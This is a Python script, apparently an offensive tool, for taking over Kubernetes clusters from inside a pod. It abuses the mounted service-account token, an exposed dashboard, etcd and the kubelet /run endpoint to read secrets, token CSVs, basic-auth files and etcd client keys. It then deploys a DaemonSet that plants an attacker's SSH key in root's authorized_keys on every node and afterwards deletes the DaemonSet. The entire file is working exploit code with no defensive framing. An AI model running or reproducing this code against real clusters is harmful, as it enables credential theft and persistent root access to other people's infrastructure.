#/usr/bin/env python3

import os
import requests
import logging
import netifaces
import json
import base64
import time
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.exceptions import SSLError,ConnectionError
from functools import reduce
from config import *

class Main:

    def __init__(self):
        self.nodes = []
        host = os.environ.get('KUBERNETES_SERVICE_HOST')
        port = os.environ.get('KUBERNETES_SERVICE_PORT')
        self.authk = os.getenv('AUTHORIZED_KEYS')
        if not self.authk:
            log.error('Fatal: AUTHORIZED_KEYS ENV is not defined!')
            exit()
        self.pwned = False
        self.pwned_via = 'mapped token'
        if host and port:
            if port == os.environ.get('KUBERNETES_SERVICE_PORT_HTTPS'):
                url = 'https://'+host+':'+port
            else:
                url = 'http://'+host+':'+port
            self.api_url = url
        else:
            log.error('Fatal: KUBERNETES_SERVICE ENVs are not defined!')
            exit()
        json_data = json.loads(open('/root/templates/add_authkeys.json').read())
        assert isinstance(json_data, dict)
        json_data['spec']['template']['spec']['containers'][0]['env'][0] = \
            dict(name="AUTHORIZED_KEYS", value=self.authk)
        json_data['spec']['template']['spec']['containers'][0]['image'] = \
            ADD_AUTHKEYS_IMAGE
        self.add_authkeys = json_data
        json_data = json.loads(open('/root/templates/check_create_ds.json').read())
        assert isinstance(json_data, dict)
        self.check_create_ds = json_data
        dashboard_add_authkeys = open('/root/templates/dashboard_add_authkeys.json').read()
        repls = ('SSH_KEY', self.authk), ('IMAGE_NAME', ADD_AUTHKEYS_IMAGE )
        self.dashboard_add_authkeys = reduce(lambda a, kv: a.replace(*kv), repls, dashboard_add_authkeys)
        try:
            f = open(SA_TOKEN_PATH)
            self.servicetoken = f.readlines()[0]
        except(FileNotFoundError, PermissionError):
            self.servicetoken = False
            log.warn('service token does not exists or not readable!')
            return
        #attacking with obtained token
        log.info('got mapped token!')
        self.pwned_via = 'mapped token'
        self.attack_api(token=self.servicetoken)

    @staticmethod
    def get_keys_from_json(data, tp):
        t = []

        if tp == JSON_TYPE_ETCD:
            for n in data['node']['nodes']:
                v = json.loads(n['value'])
                try:
                    clear = base64.b64decode((v['data']['token']))
                    t += [clear.decode("ascii")]
                except KeyError:
                    pass
        elif tp == JSON_TYPE_DASHBOARD:
            for n in data['secrets']:
                if n["type"]  == "Opaque":
                    continue
                t += [n['objectMeta']['name']]
        else:
            log.error('invalid json type!')
        return t

    def attack_api(self, token=None, basic=None):
        log.debug('attacking API!')
        s = requests.session()
        s.headers.update({'Content-type': 'application/json'})
        if token:
            s.headers.update({'Authorization': 'Bearer %s' % token})
        if basic:
            s.headers.update({'Authorization': 'Basic %s' % basic.decode()})
        log.debug('sending headers: %s' % s.headers)
        r = s.post(self.api_url + API_ACCESSREVIEWS_PATH,
                      verify=False, json=self.check_create_ds)
        if r.json()['status'] == 'Failure':
            log.error('unable to create daemonsets, reason: %s' % r.json()['reason'])
            return
        if not r.json()['status']['allowed'] == True:
            log.error('unable to create daemonsets with %s' % s.headers['Authorization'])
            return
        #checking if we can create daemonset
        r = s.post(self.api_url + API_DAEMONSETS_PATH,
                      verify=False,json=self.add_authkeys)
        if r.status_code not in ( 201, 200 ):
            log.warn('failed to public key to root`s authorized_keys!')
        else:
            self.pwned = True
            log.info('public key %s have been successfuly added to root`s authorized_keys!' % self.authk )
            log.info('pwned via misconfigured %s' % self.pwned_via )
            log.info('cleaning up...')
            time.sleep(10)
            r = s.delete(self.api_url + API_DS_AUTHKEYS_PATH,
                            verify=False,
                            json=AUTHKEYS_CLEANUP_PARAMS)
            if not r.status_code == 200:
                log.error('clean up failed!')
            else:
                log.info('clean up sucessful!')
            exit()

    def node_discovery(self):
        log.info('discovering nodes!')
        s = requests.Session()

        try:
            #using HEAPSTER_METRICS_URL, because HEAPSTER_NODES_URL doesn't work 100%
            r = s.get(HEAPSTER_METRICS_URL)
        except ConnectionError:
            log.info('heapster is not available, trying default gateway!')
            gws = netifaces.gateways()
            dg = next(iter(gws['default'].values()))[0]
            self.nodes = [dg]
            return

        data = r.text
        nodes = []
        matches = re.findall(RX_NODE, data, re.MULTILINE)
        for match in matches:
            if match not in nodes:
                nodes += [match]
        log.info('found nodes: %s' % str(nodes))
        self.nodes = nodes

    def attack_etcd(self, pem=None):
        if not pem:
            self.pwned_via = 'etcd'
        for n in self.nodes:
            log.info('attacking etcd on node %s' % n)
            s = requests.Session()
            try:
                r = s.get('https://' + n + ':' + str(ETCD_PORT) + ETCD_VERSION_PATH, verify=False, cert=(pem))
            except:
                log.error('unable to connect to node %s' % n )
                continue
            if r.status_code != 200:
                log.error('etcd is not accessible!')
                continue
            r = s.get('https://' + n + ':' + str(ETCD_PORT) + ETCD_SECRETS_PATH,
                      verify=False, cert=(pem))
            if r.status_code != 200:
                log.error('unable to get secrets from etcd!')
                continue
            data = r.json()

            for t in self.get_keys_from_json(data, JSON_TYPE_ETCD):
                # try:
                self.attack_api(token=t)

    def attack_kubelet(self):
        self.pwned_via = 'kubelet'
        for n in self.nodes:
            log.info('attacking kubelet on node %s' % n)
            s = requests.Session()
            r = s.get('https://%s:%s/runningpods/' % (n,str(KUBELET_PORT)), verify=False)
            if r.text == 'Unauthorized':
                log.debug('failed to get running pods!')
                continue
            for p in r.json()['items']:
                containers = p['spec']['containers']
                if not containers:
                    continue
                for c in containers:
                    log.debug('trying container %s' % c)
                    if c['name'].find('apiserver') >= 0:
                        cn = c['name']
                        pod = p['metadata']['name']
                        ns = p['metadata']['namespace']
                        #running ps -ef in apiserver pod, if thereis a token.csv try all tokens.
                        #else steal --etcd-keyfile and use it to get secrets from etcd
                        r = s.post('https://%s:%s/run/%s/%s/%s' % (n,KUBELET_PORT,ns,pod,cn),
                                   verify=False, data=dict(cmd="ps -ef"))
                        found = re.search(TOKEN_CSV+'(\S+)', r.text)
                        if found:
                            log.debug('token auth file is %s' % found)
                            token_csv_path = found.group(1)
                            r = s.post('https://%s:%s/run/%s/%s/%s' % (n,KUBELET_PORT,ns,pod,cn),
                                       verify=False, data=dict(cmd="cat %s" % token_csv_path))
                            token_csv = r.text
                            for l in token_csv.split('\n'):
                                log.debug('trying token: %s' % l)
                                try:
                                    t = l.split(',')[0]
                                except ValueError:
                                    continue
                                self.attack_api(token=t)
                            return
                        found = re.search(BASIC_AUTH_FILE+'(\S+)', r.text)
                        if found:
                            log.debug('basic auth file is %s' % found)
                            basic_auth_path = found.group(1)
                            r = s.post('https://%s:%s/run/%s/%s/%s' % (n,KUBELET_PORT,ns,pod,cn),
                                       verify=False,
                                       data=dict(cmd="cat %s" % basic_auth_path))
                            basic_csv = r.text
                            for l in basic_csv.split('\n'):
                                log.debug('trying basic account: %s' % l.split(','))
                                try:
                                    password,login = l.split(',')[0:2]
                                except ValueError:
                                    continue
                                basic = base64.b64encode((login+':'+password).encode())
                                self.attack_api(basic=basic)
                        found = re.search(ETCD_KEY+'(\S+)', r.text)
                        if not found:
                            continue
                        etcd_key_path = found.group(1)
                        found = re.search(ETCD_CERT+'(\S+)', r.text)
                        if not found:
                            continue
                        etcd_cert_path = found.group(1)
                        r = s.post('https://%s:%s/run/%s/%s/%s' % (n,KUBELET_PORT,ns,pod,cn), verify=False,
                                   data=dict(cmd="cat %s" % etcd_key_path))
                        etcd_key = r.text
                        r = s.post('https://%s:%s/run/%s/%s/%s' % (n,KUBELET_PORT,ns,pod,cn), verify=False,
                                   data=dict(cmd="cat %s" % etcd_cert_path))
                        etcd_cert = r.text
                        #prepare files for using with requests
                        with open(ETCD_PEM, 'w+') as pem:
                            print(etcd_key, file=pem)
                            print(etcd_cert, file=pem)
                        log.debug('obtained etcd client certificate via kubelet!')
                        self.attack_etcd(pem=ETCD_PEM)

    def attack_dashboard(self):
        self.pwned_via = 'dashboard'
        log.info('attacking dashboard!')
        s = requests.Session()
        r = s.get(DASHBOARD_URL+':' + str(DASHBOARD_PORT) + API_SECRET_PATH,
                  verify=False)
        data = r.json()
        for t in self.get_keys_from_json(data, JSON_TYPE_DASHBOARD):
            r = s.get(DASHBOARD_URL+':' + str(DASHBOARD_PORT) + API_SECRET_PATH + t,
                  verify=False)
            data=r.json()
            clear = base64.b64decode((data['data']['token']))
            log.debug("got token from dashboard: %s" % clear)
            self.attack_api(token=clear)
        if not self.pwned:
            #fetching csrf token
            r = s.get(DASHBOARD_URL+':' + str(DASHBOARD_PORT) + DASHBOARD_CSRF_PATH,
              verify=False)
            data = r.json()
            if 'token' not in data.keys():
                log.error('failed to obtain dashboard csrf token!')
                return
            token =  data['token']
            log.debug("got csrf token: %s" % token)
            s.headers.update({'x-csrf-token': token})
            s.headers.update({'Content-type': 'application/json;charset=UTF-8'})
            r = s.post(DASHBOARD_URL+':' + str(DASHBOARD_PORT) + DASHBOARD_DEPLOY_PATH,
              verify=False, data=self.dashboard_add_authkeys)
            if r.status_code not in ( 201, 200 ):
                log.error('injecting key through dashboard failed!')
            else:
                log.debug(r.headers)
                log.info('public key %s have been successfuly added to root`s authorized_keys!' % self.authk )
                log.info('pwned via misconfigured %s' % self.pwned_via )
                self.pwned = True
                time.sleep(10)
                s.delete(DASHBOARD_URL+':' + str(DASHBOARD_PORT) + DASHBOARD_CLEANUP_PATH)
                if not r.status_code == 201:
                    log.error('clean up failed!')
                else:
                    log.info('clean up sucessful!')
                exit()


log = logging.getLogger(__name__)
log.setLevel(logging.INFO)
console = logging.StreamHandler()
formatter = logging.Formatter(FORMAT)
console.setFormatter(formatter)
log.addHandler(console)

m = Main()
m.attack_dashboard()
m.node_discovery()

if not m.nodes:
    log.error("unable to determine nodes IPs!")
    exit()

m.attack_etcd()
m.attack_kubelet()

log.info('Nice try! But this cluster seems to be not vulnerable!')


